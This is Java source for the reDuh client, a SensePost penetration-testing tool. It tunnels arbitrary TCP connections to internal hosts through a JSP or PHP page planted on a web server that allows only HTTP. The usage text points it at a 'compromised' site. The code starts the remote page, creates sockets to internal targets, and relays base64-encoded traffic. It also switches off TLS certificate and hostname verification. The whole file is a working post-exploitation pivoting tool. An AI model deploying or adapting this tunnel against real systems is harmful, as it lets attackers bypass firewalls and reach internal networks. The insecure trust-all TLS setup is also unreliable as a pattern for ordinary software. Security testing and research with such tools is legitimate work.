package com.sensepost.reDuh;

/**
 * The name? redirector.jsp ==> redir.jsp ==> reDuh.jsp
 *
 * reDuh allows us to tunnel TCP traffic to any machine:port pair through a webserver which is only open on port 80.
 * If you don't know why this is useful, you probably don't need it.
 *
 *      Author:
 *	Glenn Wilkinson
 *	glenn@sensepost.com
 * 
 *      Bugfixes and enhancements:
 *      Ian de Villiers
 *      ian@sensepost.com
 **/
import java.io.*;
import java.net.*;
import java.net.URL;
import java.util.*;
import java.util.Properties;
import javax.net.*;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class reDuhClient {

    URL the_url;
    String the_prx;
    int servicePort = 1010;
    int remoteServicePort = -1;
    Hashtable inboundData = new Hashtable();
    Base64 encoder = new Base64();
    int newSockNum = 0;
    Queue httpDataBuffer = new LinkedList<String>();
    PrintWriter pr = null;

    reDuhClient(URL _url, String _prx) {

        the_url = _url;
        the_prx = _prx;

        startRemoteJSP rJSP = new startRemoteJSP();
        popDataFromRemoteJSP rPOPPER = new popDataFromRemoteJSP();
        rJSP.start();

        while (rJSP.hasRemoteReDuhStarted() == -1) {
            try {
                Thread.sleep(50);
            } catch (Exception e) {
                System.out.println("[Error]Error waiting for remote web page to start.");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
        }
        if (rJSP.hasRemoteReDuhStarted() == 1) {
            rPOPPER.start();
            serviceInterface sI = new serviceInterface();
            httpDataQueueManager dataQM = new httpDataQueueManager();
            dataQM.start();
            sI.start();
        } else {
            System.out.println("[Error]We could not start remote web page.  Exiting");
        }

    }

    //1. Poll httpDataBuffer for contents
    //2. Send contents to remote JSP
    class httpDataQueueManager extends Thread {

        boolean keepRunning = true;

        public void stopPlz() {
            keepRunning = false;
        }

        public synchronized void run() {
            String input = null;
            while (keepRunning) {
                try {
                    while ((input = (String) httpDataBuffer.poll()) != null) {

                        String tokens[] = (input.substring(input.indexOf("]") + 1)).split(":");
                        String internalTarget = tokens[0];
                        String internalPort = tokens[1];
                        String sockNum = tokens[2];
                        String seqNum = tokens[3];
                        String data = tokens[4];

                        try {
                            String params = "action=newData&servicePort=" + remoteServicePort + "&targetHost=" + internalTarget + "&targetPort=" + internalPort + "&socketNumber=" + sockNum + "&data=" + data + "&sequenceNumber=" + seqNum;
                            String tmp_proto = the_url.getProtocol();
                            String tmp_host = the_url.getHost();
                            int tmp_port = the_url.getPort();
                            if (tmp_port == -1) {
                                tmp_port = the_url.getDefaultPort();
                            }
                            String tmp_file = the_url.getFile();
                            String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                            URL new_url = new URL(tmp_url);
                            BufferedReader httpResponseBuffer = HTTPER.speakToWebServer(new_url);
                            if (httpResponseBuffer != null) {
                                String blah = null;

                                while ((blah = httpResponseBuffer.readLine()) != null) {
                                    if (blah.compareTo("") != 0) {
                                        System.out.println("[Info]" + blah);
                                    }
                                }
                            } else {
                                System.out.println("[Error]NULL Response received in newData.  This might not be serious. Lets carry on.");
                            }
                        } catch (Exception e) {
                            System.out.println("[Error]Error in newData");
                            System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                        }
                        Thread.sleep(50);
                    }
                    Thread.sleep(50);
                } catch (Exception e) {
                }
            }
        }
    }

    //1. Haroon's polling method :)
    //2. Loops forever, polling the webserver via a action=getData request
    //3. Webserver returns [data], [info], or [NO_NEW_DATA]
    class popDataFromRemoteJSP extends Thread {

        public synchronized void run() {
            String params = "action=getData&servicePort=" + remoteServicePort;
            String dataFromWebserver = null;
            try {
                while (true) {
                    String tmp_proto = the_url.getProtocol();
                    String tmp_host = the_url.getHost();
                    int tmp_port = the_url.getPort();
                    if (tmp_port == -1) {
                        tmp_port = the_url.getDefaultPort();
                    }
                    String tmp_file = the_url.getFile();
                    String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                    URL new_url = new URL(tmp_url);
                    BufferedReader httpResponseBuffer = HTTPER.speakToWebServer(new_url);
                    if (httpResponseBuffer != null) {
                        dataFromWebserver = httpResponseBuffer.readLine();
                        if (dataFromWebserver.compareTo("") == 0) //Remove leading
                        {
                            while ((dataFromWebserver = httpResponseBuffer.readLine()).compareTo("") == 0) {
                            }
                        }
                        String tag = dataFromWebserver.substring(dataFromWebserver.indexOf("[") + 1, dataFromWebserver.indexOf("]"));

                        if (tag.compareTo("data") == 0) {
                            String[] tokens = dataFromWebserver.substring(dataFromWebserver.indexOf("]") + 1).split(":");
                            String remTarget = tokens[0];
                            int remPort = Integer.parseInt(tokens[1]);
                            int sockNum = Integer.parseInt(tokens[2]);
                            String remData = tokens[3];

                            if (!inboundData.containsKey(remTarget + ":" + remPort + ":" + sockNum)) {
                                if (remData.compareTo("*") != 0) {
                                    System.out.println("[Error]Adding data to " + remTarget + ":" + remPort + ":" + sockNum + " queue.  Queue does not exist.  Recommend you exit.");
                                } else {
                                }

                            } else {
                                ((Queue<String>) inboundData.get(remTarget + ":" + remPort + ":" + sockNum)).add(remData);
                            }
                        } else if (tag.compareTo("NO_NEW_DATA") == 0) {
                        } else {
                            System.out.println("[Error]Popped remote web page queue.  Unknown response received: " + dataFromWebserver);
                        }
                    } else {
                        System.out.println("[Error]NULL Response received in getData.  This might not be serious. Lets carry on.");
                    }
                    Thread.sleep(50);
                }
            } catch (Exception e) {
                System.out.println("[Error]Error in getData");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
        }
    }

    class startRemoteJSP extends Thread {

        int remoteReDuhProcessStarted = -1;

        public int hasRemoteReDuhStarted() {
            return remoteReDuhProcessStarted;
        }

        public boolean checkUsableRemoteRPCPort(int _startPort) {
            try {
                String dataFromWebserver = null;
                String params = "action=checkPort&port=" + _startPort;
                String tmp_proto = the_url.getProtocol();
                String tmp_host = the_url.getHost();
                int tmp_port = the_url.getPort();
                if (tmp_port == -1) {
                    tmp_port = the_url.getDefaultPort();
                }
                String tmp_file = the_url.getFile();
                String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                URL new_url = new URL(tmp_url);
                BufferedReader httpResponseBuffer = HTTPER.speakToWebServer(new_url);
                try {
                    if (httpResponseBuffer != null) {
                        dataFromWebserver = httpResponseBuffer.readLine();
                        if (dataFromWebserver.compareTo("") == 0) {
                            while ((dataFromWebserver = httpResponseBuffer.readLine()).compareTo("") == 0) {
                            }
                        }
                        if (dataFromWebserver.contains("Success")) {
                            return true;
                        } else {
                            return false;
                        }
                    } else {
                        System.out.println("[Error]NULL Response received in checkPort.  This might not be serious. Lets carry on.");
                    }
                } catch (Exception e) {
                    System.out.println("[Error]Error in checkPort");
                    System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                }
            } catch (Exception e) {
                System.out.println("[Error]Error in checkPort");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
            return false;
        }

        public void run() {
            String dataFromWebserver = null;
            BufferedReader httpResponseBuffer = null;
            System.out.println("[Info]Querying remote web page for usable remote service port");
            remoteServicePort = 42000;

            while (!checkUsableRemoteRPCPort(remoteServicePort) && remoteServicePort <= 42050) {
                remoteServicePort++;
            }
            if (remoteServicePort >= 42100) {
                System.out.println("[Error]Tried to find a remote service port between 42000:42100.  No attempts were successful. Sorry it didn't work out.");
                System.exit(-1);
            }
            System.out.println("[Info]Remote RPC port chosen as " + remoteServicePort);
            if (the_url.getPort() == -1) {
                System.out.println("[Info]Attempting to start reDuh from " + the_url.getHost() + ":" + the_url.getDefaultPort() + the_url.getFile() + ".  Using service port " + remoteServicePort + ". Please wait...");
            } else {
                System.out.println("[Info]Attempting to start reDuh from " + the_url.getHost() + ":" + the_url.getPort() + the_url.getFile() + ".  Using service port " + remoteServicePort + ". Please wait...");
            }

            try {
                String params = "action=startReDuh&servicePort=" + remoteServicePort;
                String tmp_proto = the_url.getProtocol();
                String tmp_host = the_url.getHost();
                int tmp_port = the_url.getPort();
                if (tmp_port == -1) {
                    tmp_port = the_url.getDefaultPort();
                }
                String tmp_file = the_url.getFile();
                String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                URL new_url = new URL(tmp_url);
                if (the_url.getFile().toLowerCase().endsWith(".php")) {
                    System.out.println("[Info]*********************************************************");
                    System.out.println("[Info]***                  Using php                        ***");
                    System.out.println("[Info]*********************************************************");
                    System.out.println("[Info]*** We'll not know whether reDuh started successfully ***");
                    System.out.println("[Info]*** Starting ReDuh now and lets hope for the best...  ***");
                    System.out.println("[Info]*********************************************************");
                    remoteReDuhProcessStarted = 1;
                }
                if (the_prx.compareTo("") != 0) {
                    System.out.println("[Info]*********************************************************");
                    System.out.println("[Info]***                 Using proxy                       ***");
                    System.out.println("[Info]*********************************************************");
                    System.out.println("[Info]*** We'll not know whether reDuh started successfully ***");
                    System.out.println("[Info]*** Starting ReDuh now and lets hope for the best...  ***");
                    System.out.println("[Info]*********************************************************");
                    remoteReDuhProcessStarted = 1;
                }
                httpResponseBuffer = HTTPER.speakToWebServer(new_url);


                if (httpResponseBuffer != null) {
                    remoteReDuhProcessStarted = 1;
                    dataFromWebserver = httpResponseBuffer.readLine();
                    while ((dataFromWebserver = httpResponseBuffer.readLine()) != null && remoteReDuhProcessStarted != 0) {
                    }
                } else {
                    System.out.println("[Error]NULL Response received in startReDuh.  This might not be serious. Lets carry on.");
                }
            } catch (Exception e) {
                System.out.println("[Error]Error in startReDuh");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
            System.out.println("[Info]Main remote reDuh process has ended. I'm going to exit too. Thanks for playing");
            System.exit(1);

        }
    }

    class serviceInterface extends Thread {

        ServerSocket srv = null;
        BufferedReader br = null;
        String input = null;
        boolean result = false;
        Socket sock = null;
        String dataFromWebserver = null;
        BufferedReader httpResponseBuffer = null;

        public void run() {
            try {
                srv = new ServerSocket(servicePort);
            } catch (Exception e) {
                System.err.println("[Error]Cannot bind to service port " + servicePort);
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                System.exit(-1);
            }
            System.out.println("[Info]reDuhClient service listener started on local port " + servicePort);
            while (true) {
                try {
                    sock = srv.accept();
                    System.out.println("[Info]Caught new service connection on local port " + servicePort);
                    br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                    pr = new PrintWriter(sock.getOutputStream(), true);
                    pr.print("Welcome to the reDuh command line\n>>");
                    pr.flush();
                    while ((input = br.readLine()) != null) {

                        if (!input.contains("[") || !input.contains("]") || input.indexOf("]") < input.indexOf("[")) {
                            pr.println("Bad syntax. Type [usage] for help.");
                        } else {
                            String command = input.substring(input.indexOf("["), input.indexOf("]") + 1);
                            if (command.compareTo("[createTunnel]") == 0) {
                                try {
                                    int localListenPort = Integer.parseInt(input.substring(input.indexOf("]") + 1, input.indexOf(":")));
                                    String internalTarget = input.substring(input.indexOf(":") + 1, input.lastIndexOf(":"));
                                    int internalTargetPort = Integer.parseInt(input.substring(input.lastIndexOf(":") + 1));
                                    localServerListener serveMe = new localServerListener(localListenPort, internalTarget, internalTargetPort);
                                    serveMe.start();
                                    if (serveMe.boundSuccessfully()) {
                                        System.out.println("[Info]Successfully bound locally to port " + localListenPort + ". Awaiting connections.");
                                        pr.println(" Successfully bound locally to port " + localListenPort + ". Awaiting connections.");
                                    } else {
                                        System.out.println("[Error]Cannot bind locally to " + localListenPort + ". Aborting socket creation attempt. Sorry it didn't work out.");
                                        pr.println(" Cannot bind locally to " + localListenPort + ". Aborting socket creation attempt. Sorry it didn't work out.");
                                    }
                                } catch (Exception e) {
                                    System.out.println("[Error]Bad syntax for [createTunnel]");
                                    pr.println("[Error]Bad syntax for [createTunnel]");
                                }

                            } else if (command.compareTo("[closeTunnel]") == 0) {
                                //TODO
                            } else if (command.compareTo("[usage]") == 0) {
                                usage();
                            } else if (command.compareTo("[DEBUG]") == 0) {
                                int newDebugLevel = -1;
                                if (command.length() == input.length()) {
                                    System.out.println("[Error]Bad syntax for [DEBUG]");
                                    pr.println(" Bad syntax for [DEBUG]");
                                } else {
                                    try {
                                        newDebugLevel = Integer.parseInt(input.substring(input.indexOf("]") + 1));
                                    } catch (Exception e) {
                                        System.out.println("[Error]Bad syntax for [DEBUG]");
                                        pr.println("2Bad syntax for [DEBUG]");
                                    }
                                }
                                System.out.println("[Info]Set debug level to " + newDebugLevel);
                                pr.println(" Set debug level to " + newDebugLevel);
                            } else if (command.compareTo("[killReDuh]") == 0) {
                                pr.println(" Sent kill signals....");
                                try {
                                    String params = "action=killReDuh&servicePort=" + remoteServicePort;
                                    String tmp_proto = the_url.getProtocol();
                                    String tmp_host = the_url.getHost();
                                    int tmp_port = the_url.getPort();
                                    if (tmp_port == -1) {
                                        tmp_port = the_url.getDefaultPort();
                                    }
                                    String tmp_file = the_url.getFile();
                                    String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                                    URL new_url = new URL(tmp_url);
                                    httpResponseBuffer = HTTPER.speakToWebServer(new_url);
                                    if (httpResponseBuffer != null) {
                                        dataFromWebserver = httpResponseBuffer.readLine();
                                        if (dataFromWebserver.compareTo("") == 0) {
                                            while ((dataFromWebserver = httpResponseBuffer.readLine()).compareTo("") == 0) {
                                            }
                                        }
                                        while ((dataFromWebserver = httpResponseBuffer.readLine()) != null) {
                                        }
                                    } else {
                                        System.out.println("[Error]NULL Response received in killReDuh.  This might not be serious. Lets carry on.");
                                        pr.println("[Error]NULL Response received in startReDuh.  This might not be serious. Lets carry on.");
                                    }
                                } catch (Exception e) {
                                }

                            } else {
                                pr.println("Unknown command - \"" + command + "\". Type [usage] for help.");
                            }
                        }
                        pr.print("\n>>");
                        pr.flush();
                    }
                } catch (Exception e) {
                    System.out.println("[Error]Unhandled exception");
                    System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    System.exit(-1);
                }
            }
        }

        public void usage() {
            pr.println("Commands are of the form [command]{options}\n\nAvailable commands:");
            pr.println(" [usage] - This menu");
            pr.println(" [createTunnel]<localPort>:<targetHost>:<targetPort>");
            pr.println(" [killReDuh] - terminates remote JSP process, and ends this client program");
            pr.println(" [DEBUG]<0|1|2> - Sets the verbosity");
        }
    }

    class localServerListener extends Thread {

        String remoteTarget = null;
        int remotePort = -1;
        int listenPort = -1;
        ServerSocket srvr = null;
        Socket sockr = null;
        boolean boundSuccessfully = false;
        boolean triedToBind = false;
        boolean runServer = true;

        localServerListener(int _listenPort, String _remoteTarget, int _remotePort) {
            remoteTarget = _remoteTarget;
            remotePort = _remotePort;
            listenPort = _listenPort;
        }

        public void run() {

            try {
                srvr = new ServerSocket(listenPort);
                boundSuccessfully = true;
            } catch (Exception e) {
                boundSuccessfully = false;
            }
            triedToBind = true;
            if (boundSuccessfully) {
                while (runServer) {
                    try {
                        sockr = srvr.accept();
                        localServerConnectionHandler caughtConn = new localServerConnectionHandler(sockr, remoteTarget, remotePort, listenPort);
                        caughtConn.start();
                    } catch (Exception e) {
                        System.out.println("[Error]Whilst receiving or handling socket for " + listenPort);
                        System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    }
                }
            }


        }

        public boolean boundSuccessfully() {
            while (!triedToBind) {
            }
            return boundSuccessfully;
        }

        //To stop the server, set its flag to false, and make a connection to it to remove the block
        //[not being used]
        public void stopServer() {
            try {
                System.out.println("[Info]Stopping service on " + listenPort);
                runServer = false;
                Socket tmp = new Socket("localhost", listenPort);
                tmp.close();
                srvr.close();

            } catch (Exception e) {
                System.out.println("[Error]Could not comply with Stop Server Request");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
        }
    }

    class localServerConnectionHandler extends Thread {

        Socket sockr = null;
        InputStream fromClient = null;
        OutputStream toClient = null;
        PrintWriter rw = null;
        BufferedReader rd = null;
        String remoteTarget = null;
        int remotePort = -1;
        int listenPort = -1;

        localServerConnectionHandler(Socket _sock, String _remoteTarget, int _remotePort, int _listenPort) {
            sockr = _sock;
            remoteTarget = _remoteTarget;
            remotePort = _remotePort;
            listenPort = _listenPort;
        }

        public void run() {

            System.out.println("[Info]Requesting reDuh to create socket to " + remoteTarget + ":" + remotePort);

            try {
                fromClient = sockr.getInputStream();
                toClient = sockr.getOutputStream();
            } catch (Exception e) {
                System.out.println("[Error]Problem with IO stream for " + remoteTarget + ":" + remotePort + ". Aborting socket creation attempt. Sorry it didn't work out");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
            newSockNum++;
            inboundData.put(remoteTarget + ":" + remotePort + ":" + newSockNum, new LinkedList<String>());
            try {
                String params = "action=createSocket&servicePort=" + remoteServicePort + "&socketNumber=" + newSockNum + "&targetHost=" + remoteTarget + "&targetPort=" + remotePort;
                String tmp_proto = the_url.getProtocol();
                String tmp_host = the_url.getHost();
                int tmp_port = the_url.getPort();
                if (tmp_port == -1) {
                    tmp_port = the_url.getDefaultPort();
                }
                String tmp_file = the_url.getFile();
                String tmp_url = tmp_proto + "://" + tmp_host + ":" + tmp_port + tmp_file + "?" + params;
                URL new_url = new URL(tmp_url);
                String dataFromWebserver = null;
                BufferedReader httpResponseBuffer = HTTPER.speakToWebServer(new_url);
                if (httpResponseBuffer != null) {
                    try {
                        dataFromWebserver = httpResponseBuffer.readLine();
                        if (dataFromWebserver.compareTo("") == 0) //Remove leading
                        {
                            while ((dataFromWebserver = httpResponseBuffer.readLine()).compareTo("") == 0) {
                            }
                        }
                        if (dataFromWebserver.contains("Success")) {
                            handleLocalInput inner = new handleLocalInput(fromClient, remoteTarget, remotePort, newSockNum);
                            handleLocalOutput outter = new handleLocalOutput(toClient, remoteTarget, remotePort, newSockNum);
                            inner.start();
                            outter.start();
                            System.out.println("[Info]Successfully created socket " + listenPort + ":" + remoteTarget + ":" + remotePort + ":" + newSockNum);
                            outter.join();
                            sockr.close();
                            System.out.println("[Info]Local socket closed for " + remoteTarget + ":" + remotePort + ":" + newSockNum);
                        } else {
                            //reDuh couldn't create socket. Undo previous steps and abort.
                            System.out.println("[Error]reDuh cannot create socket to " + remoteTarget + ":" + remotePort + ". Aborting socket creation attempt. Sorry it didn't work out.");
                            inboundData.remove(remoteTarget + ":" + remotePort + ":" + newSockNum);
                            sockr.close();
                        }
                    } catch (Exception e) {
                        System.out.println("[Error]Exception whilst reading from HTTP response stream.");
                        System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    }

                } else {
                    System.out.println("[Error]NULL Response received in createSocket.  This might not be serious. Lets carry on.");
                    inboundData.remove(remoteTarget + ":" + remotePort + ":" + newSockNum);
                    try {
                        sockr.close();
                    } catch (Exception e) {
                        System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    }
                }
            } catch (Exception e) {
                System.out.println("[Error]Unhandled error in createSocket");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
        }
    }

    class handleLocalInput extends Thread {

        InputStream fromClient = null;
        Socket toLocalServicePort = null;
        int numberRead = 0;
        int bufferSize = 2500;
        byte[] buffer = null;
        byte[] tmpBuffer = null;
        Socket toServiceLocalPort = null;
        String target = null;
        int targetPort = -1;
        int sockNum = -1;
        boolean endOfTransmission = false;

        handleLocalInput(InputStream _fromClient, String _target, int _targetPort, int _sockNum) {

            fromClient = _fromClient;
            buffer = new byte[bufferSize];
            target = _target;
            targetPort = _targetPort;
            sockNum = _sockNum;
            try {
                toLocalServicePort = new Socket("localhost", servicePort);
            } catch (Exception e) {
                System.out.println("[Error]Whilst creating socket to local service port.");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
        }

        public synchronized void run() {
            int sequenceNumber = 0;
            try {
                while (!endOfTransmission) {

                    numberRead = fromClient.read(buffer, 0, bufferSize);
                    if (numberRead == -1) {
                        endOfTransmission = true;
                    } else if (numberRead < bufferSize) {
                        tmpBuffer = new byte[numberRead];
                        for (int j = 0; j < numberRead; j++) {
                            tmpBuffer[j] = buffer[j];
                        }
                        httpDataBuffer.add(target + ":" + targetPort + ":" + sockNum + ":" + (sequenceNumber++) + ":" + new String(encoder.encode(tmpBuffer)));
                        System.out.println("[Info]Localhost ====> " + target + ":" + targetPort + ":" + sockNum + " (" + numberRead + " bytes read from local socket)");
                    } else {
                        httpDataBuffer.add(target + ":" + targetPort + ":" + sockNum + ":" + (sequenceNumber++) + ":" + new String(encoder.encode(buffer)));
                        System.out.println("[Info]Localhost ====> " + target + ":" + targetPort + ":" + sockNum + " (" + numberRead + " bytes read from local socket)");
                    }

                }
            } catch (Exception e) {
                endOfTransmission = true;
            }
            httpDataBuffer.add(target + ":" + targetPort + ":" + sockNum + ":" + (sequenceNumber++) + ":*");
        }
    }

    class handleLocalOutput extends Thread {

        OutputStream toClient = null;
        String target = null;
        int targetPort = -1;
        int sockNum = -1;
        boolean endOfTransmission = false;

        handleLocalOutput(OutputStream _toClient, String _target, int _targetPort, int _sockNum) {
            toClient = _toClient;
            target = _target;
            targetPort = _targetPort;
            sockNum = _sockNum;
        }

        public synchronized void run() {

            if (inboundData.containsKey(target + ":" + targetPort + ":" + sockNum)) {
                String data = null;
                try {
                    while (!endOfTransmission) {
                        while ((data = ((Queue<String>) inboundData.get(target + ":" + targetPort + ":" + sockNum)).poll()) != null) {
                            if (data.compareTo("*") != 0) {												// a star is the eof token)
                                byte[] tmp = null;
                                int bytesReadFromRemotePort = 0;
                                for (int k = 0; k < data.length(); k += 4) {
                                    String inputChunk = data.substring(k, k + 4);
                                    tmp = encoder.decode(inputChunk.getBytes());
                                    bytesReadFromRemotePort += tmp.length;
                                    toClient.write(tmp);
                                }
                                System.out.println("[Info]Localhost <==== " + target + ":" + targetPort + ":" + sockNum + " (" + bytesReadFromRemotePort + " bytes picked up from remote port)");
                            } else {
                                endOfTransmission = true;
                            }
                            Thread.sleep(50);
                        }
                        Thread.sleep(50);
                    }
                } catch (Exception e) {
                    System.out.println("[Info]Local socket closed for " + target + ":" + targetPort + ":" + sockNum);
                } finally {
                    inboundData.remove(target + ":" + targetPort + ":" + sockNum);
                    System.out.println("[Info]Remote socket closed for " + target + ":" + targetPort + ":" + sockNum);
                }
            } else {
                System.out.println("[Error]Trying to poll data from non existent hashmap buffer - " + target + ":" + targetPort + ":" + sockNum);
            }
        }
    }

    static class HTTPER {

        static public BufferedReader speakToWebServer(URL _url) {
            URL the_url = _url;
            BufferedReader webServerIn = null;

            try {
                webServerIn = new BufferedReader(new InputStreamReader(the_url.openStream()));
            } catch (Exception e) {
                System.out.println("[Error]Error getting page.");
                System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
            }
            return webServerIn;
        }
    }

    public static void main(String[] args) {

        String my_url = "";
        String the_prox = "";
        String ProxHost = "";
        String ProxPort = "";

        String sz_use = "Usage: java reDuhClient [URL-to-reDuh] <proxy-user:proxy-pass>@<proxy-host:proxy-port>\r\n\r\n";
        sz_use += "e.g. (HTTP) : java reDuhClient http://www.compromised.com/reDuh.jsp\r\n";
        sz_use += "e.g. (HTTPS): java reDuhClient https://www.compromised.com/reDuh.jsp\r\n";
        sz_use += "e.g. (PROXY): java reDuhClient https://www.compromised.com/reDuh.jsp proxy-server:3128\r\n";

        // Display usage anbd exit if args aren't specified correctly.
        if (args.length < 1) {
            System.out.println(sz_use);
            System.exit(1);
        }
        // Set the URL
        my_url = args[0];
        // The the proxy if required.
        if (args.length == 2) {
            the_prox = args[1];
        }
        // Now, we format the proxy stuff if specified.
        if (the_prox.compareTo("") != 0) {
            String[] tmp = the_prox.split(":");
            if (tmp.length < 2) {
                System.out.println(sz_use);
                System.out.println("\r\n");
                System.out.println("[Error]Invalid proxy specification.  Please use HOST:PORT");
                System.exit(1);
            } else {
                try {
                    int i = Integer.parseInt(tmp[1]);
                } catch (Exception e) {
                    System.out.println(sz_use);
                    System.out.println("\r\n");
                    System.out.println("[Error]Invalid proxy specification.  Please use HOST:PORT");
                    System.exit(1);
                }
                ProxHost = tmp[0];
                ProxPort = tmp[1];
                System.out.println("[Info]Using Proxy: " + ProxHost + ":" + ProxPort);
            }
        }
        // Set proxy server settings
        if (ProxHost.compareTo("") != 0) {
            Properties systemSettings = System.getProperties();
            systemSettings.put("http.proxyHost", ProxHost);
            systemSettings.put("http.proxyPort", ProxPort);
            systemSettings.put("https.proxyHost", ProxHost);
            systemSettings.put("https.proxyPort", ProxPort);
            systemSettings.put("proxySet", "true");
            System.setProperties(systemSettings);
        }
        // Now, we parse the URL.
        try {
            URL the_url = new URL(my_url);
            // If it's an SSL connection, we ignore the cert chain.
            if (the_url.getProtocol().toLowerCase().compareTo("https") == 0) {
                TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {

                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }
                    }
                };
                try {
                    SSLContext sc = SSLContext.getInstance("SSL");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    System.out.println(sz_use);
                    System.out.println("\r\n");
                    System.out.println("[Error]Setting SSLSocketFactory.");
                    System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    System.exit(1);
                }
                HostnameVerifier hv = new HostnameVerifier() {

                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };
                try {
                    HttpsURLConnection.setDefaultHostnameVerifier(hv);
                } catch (Exception e) {
                    System.out.println(sz_use);
                    System.out.println("\r\n");
                    System.out.println("[Error]Setting HostNameVerifier.");
                    System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
                    System.exit(1);
                }
            }
            // If we get here, we're OK...
            reDuhClient red = new reDuhClient(the_url, the_prox);
        } catch (Exception e) {
            System.out.println(sz_use);
            System.out.println("\r\n");
            System.out.println("[Error]Setting setting URL.");
            System.out.println("[Exception]" + e.toString().replaceAll("\n", "").replaceAll("\r", ""));
        }

    }
}
